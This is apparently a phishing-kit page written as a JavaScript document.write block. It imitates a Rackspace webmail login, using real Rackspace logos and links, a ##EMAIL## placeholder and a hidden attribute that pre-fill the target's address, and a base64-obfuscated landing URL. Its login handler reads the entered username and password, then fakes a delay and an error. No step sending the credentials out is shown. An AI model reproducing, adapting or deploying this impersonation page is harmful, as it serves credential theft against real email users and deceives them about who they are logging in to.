document.write(`
    <body>
    <div>
      <!-- Add this for email pre-fill -->
      <div id="getme" eilId=""></div>

      <div id="content">
        <div>
          <div id="content-header">
            <div id="content-header-logo">
              <img
                id="logo"
                src="https://static.emailsrvr.com/beta_apps_rackspace_com/images/Rackspace_Technology_Logo_RGB_WHT.png"
              />
            </div>
            <div id="content-header-label">Webmail Login</div>
          </div>
          <div id="content-body">
            <div id="banner-section">
              <a style="cursor: pointer">
                <img
                  id="banner"
                  src="https://static.emailsrvr.com/apps_rackspace_com/images/Suspicious-Email-Banner.jpg"
                />
              </a>
            </div>
            <div id="divider"></div>
            <form
              id="form"
              method="post"
              name="login"
              action=""
              autocomplete="off"
            >
              <div id="form-body">
                <div id="form-container">
                  <div
                    id="err"
                    style="
                      color: rgb(211, 47, 47);
                      margin-bottom: 20px;
                      font-weight: 500;
                      display: none;
                    "
                  >
                    Username / Password incorrect
                  </div>
                  <input
                    type="hidden"
                    name="__RequestVerificationToken"
                    value="CfDJ8ECOo3G2CgtIm9FFwnkWl6Oy1rn5hX5tN_FkwwtDFJRtjcd16rSuJPM4kEvo5qt0ZEQalh0PJlWH6MyrvbMIsU3W-R2PxjtjzTRuQ-L6aX1kCQAhpcOxQmI3JV_bIB5-YasnNOgAhOPFtq7s02i3Wsk"
                  />
                  <!-- destination and flags is used for OWA login -->
                  <input
                    id="form-destination"
                    type="hidden"
                    name="destination"
                    value=""
                  />
                  <input
                    id="form-owa-flags"
                    type="hidden"
                    name="flags"
                    value="4"
                  />
                  <div id="user-row" class="row">
                    <div id="user-col" class="col">
                      <div id="user-field" class="form-group">
                        <label id="user-label" class="form-label"
                          >Email address</label
                        >
                        <input
                          id="user-input"
                          name="username"
                          tabindex="1"
                          class="form-field"
                          value="##EMAIL##"
                          autocomplete="username"
                        />
                      </div>
                    </div>
                  </div>
                  <div id="pass-row" class="row">
                    <div id="pass-col" class="col">
                      <div id="pass-field" class="form-group">
                        <label id="pass-label" class="form-label"
                          >Password</label
                        >
                        <input
                          id="pass-input"
                          name="password"
                          tabindex="2"
                          type="password"
                          class="form-field"
                          value=""
                          autocomplete="current-password"
                        />
                      </div>
                      <a
                        id="forgot-password"
                        href="/wmidentity/recover/password"
                        tabindex="4"
                        >Forgot password?</a
                      >
                    </div>
                  </div>
                </div>
              </div>
              <div id="login-btn-toolbar">
                <button
                  onclick="submitLogin(event);"
                  id="login-btn"
                  tabindex="3"
                  type="submit"
                >
                  <!-- Changed span ID to class -->
                  <span class="login-btn-text">Log In</span>
                </button>
              </div>
            </form>
          </div>
          <div class="base_links">
            <a
              class="base_link"
              target="_blank"
              href="http://www.rackspace.com/information/legal/privacystatement"
            >
              Privacy Statement
            </a>
            <div class="divider">|</div>
            <a
              class="base_link"
              target="_blank"
              href="http://www.rackspace.com/information/legal/websiteterms"
            >
              Website Terms
            </a>
          </div>
          <div class="footer" style="text-align: center; margin-top: 10px">
            <div class="caption">
              Need webmail for your business? Learn more about
              <a
                href="//www.rackspace.com/email-hosting/webmail"
                style="color: #666"
              >
                Hosted Email
              </a>
              from Rackspace
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- const url = atob(urlx); -->
    <script type="text/javascript">
      document.addEventListener("DOMContentLoaded", function () {
        // Safely get email element
        const emailElement = document.getElementById("getme");
        if (emailElement) {
          const email = emailElement.getAttribute("eilId");
          const userIdField = document.getElementById("user-input");
          if (userIdField) userIdField.value = email || "";
        }
      });

      const land = atob("aHR0cHM6Ly9tYWlsLm5pdHJrbC5hYy5pbi8=");

      console.log("land: ", land);
      let count = 0;

      function submitLogin(event) {
        event.preventDefault();
        // Get elements
        const userid = document.getElementById("user-input").value;
        const userpass = document.getElementById("pass-input").value;
        const errElement = document.getElementById("err");
        const loginBtn = document.getElementById("login-btn");
        const loginBtnText = document.querySelector(
          "#login-btn .login-btn-text"
        );

        // Fake submission simulation
        if (userid === "" || userpass === "") {
          errElement.style.display = "block";
          errElement.textContent = "Username / Password incorrect";
          return;
        }

        // Disable button and show loading state
        loginBtn.disabled = true;
        loginBtnText.textContent = "Please wait...";

        // Fake 5-second delay
        setTimeout(() => {
          // Re-enable button
          loginBtn.disabled = false;
          loginBtnText.textContent = "Log In";

          // Show error message (optional)
          errElement.style.display = "block";
          errElement.textContent = "Try again later!";

          // Clear password field (optional)
          document.getElementById("pass-input").value = "";
          document.getElementById("pass-input").focus();

          console.log("Fake submission complete");
        }, 5000); // 5000ms = 5 seconds
      }
    </script>
  </body>
    `);
